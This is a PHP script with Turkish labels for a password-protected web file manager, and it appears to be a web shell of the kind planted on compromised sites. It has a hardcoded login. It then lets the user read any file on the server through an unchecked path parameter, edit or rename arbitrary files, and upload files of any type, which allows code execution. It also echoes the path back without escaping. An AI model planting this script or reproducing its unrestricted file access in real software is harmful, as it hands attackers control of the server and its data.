<?php
session_start();

// === Ayarlar ===
$username = "ico";
$password = "ico1!";
$upload_enabled = true;

$root = __DIR__;
$style_file = 'color:#000;';
$style_dir = 'color:#00a;font-weight:bold;';

// === Giriş kontrolü ===
if (!isset($_SESSION['logged_in'])) {
    if (isset($_POST['username'], $_POST['password'])) {
        if ($_POST['username'] === $username && $_POST['password'] === $password) {
            $_SESSION['logged_in'] = true;
            header("Location: ".$_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = "Hatalı kullanıcı adı veya şifre!";
        }
    }
    ?>
    <h2>Giriş Yap</h2>
    <?php if (isset($error)) echo "<p style='color:red;'>$error</p>"; ?>
    <form method="post">
        Kullanıcı Adı: <input type="text" name="username"><br>
        Şifre: <input type="password" name="password"><br>
        <input type="submit" value="Giriş">
    </form>
    <?php
    exit;
}

// === Giriş yapıldıysa ===

function updir($dir) {
    $dir = rtrim($dir, '/');
    return dirname($dir);
}

// === Dosya işlemleri ===
$path = isset($_GET['file']) ? $_GET['file'] : $root;

if (isset($_GET['edit'])) {
    $edit_file = $_GET['edit'];
    if (is_file($edit_file)) {
        if (isset($_POST['save'])) {
            file_put_contents($edit_file, $_POST['content']);
            echo "<p style='color:green;'>Dosya kaydedildi.</p>";
        }
        $content = htmlspecialchars(file_get_contents($edit_file));
        echo "<h3>Dosya Düzenle: ".basename($edit_file)."</h3>";
        echo "<form method='post'><textarea name='content' rows='20' cols='80'>$content</textarea><br>";
        echo "<input type='submit' name='save' value='Kaydet'></form><hr>";
        echo "<a href='?file=".urlencode(dirname($edit_file))."'>Geri</a>";
        exit;
    }
}

if (isset($_GET['rename'])) {
    $rename_file = $_GET['rename'];
    if (isset($_POST['newname'])) {
        $newname = dirname($rename_file).'/'.$_POST['newname'];
        rename($rename_file, $newname);
        echo "<p style='color:green;'>Dosya adı değiştirildi.</p>";
        header("Location: ?file=".urlencode(dirname($rename_file)));
        exit;
    }
    echo "<h3>Dosya Adı Değiştir: ".basename($rename_file)."</h3>";
    echo "<form method='post'>";
    echo "Yeni Ad: <input type='text' name='newname' value='".basename($rename_file)."'><br>";
    echo "<input type='submit' value='Değiştir'>";
    echo "</form><hr>";
    echo "<a href='?file=".urlencode(dirname($rename_file))."'>Geri</a>";
    exit;
}

// === Dosya yükleme ===
if (isset($_FILES['upload']) && $upload_enabled) {
    $upload_dir = is_dir($path) ? $path : dirname($path);
    $target = $upload_dir.'/'.basename($_FILES['upload']['name']);
    if (move_uploaded_file($_FILES['upload']['tmp_name'], $target)) {
        echo "<p style='color:green;'>Dosya yüklendi.</p>";
    } else {
        echo "<p style='color:red;'>Yükleme başarısız!</p>";
    }
}

echo "<h2>Dosya Yöneticisi</h2>";
echo "<p><a href='?logout=1'>Çıkış Yap</a></p>";

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: ".$_SERVER['PHP_SELF']);
    exit;
}

// === Listeleme ===
if (is_file($path)) {
    header("Content-type: text/plain");
    readfile($path);
    exit;
}

echo "<strong>Konum:</strong> $path<hr>";
echo '<a href="?file='.urlencode(updir($path)).'">[ Üst Klasör ]</a><br>';

foreach (glob($path.'/*') as $file) {
    $is_file = is_file($file);
    echo '<div><a style="'.($is_file?$style_file:$style_dir).'" href="?file='.urlencode($file).'">'.basename($file).'</a>';
    if ($is_file) {
        echo ' | <a href="?edit='.urlencode($file).'">[Düzenle]</a>';
        echo ' | <a href="?rename='.urlencode($file).'">[Yeniden Adlandır]</a>';
    }
    echo '</div>';
}

if ($upload_enabled) {
    echo "<hr><h3>Dosya Yükle</h3>";
    echo '<form method="post" enctype="multipart/form-data">';
    echo '<input type="file" name="upload"><input type="submit" value="Yükle">';
    echo '</form>';
}
?>
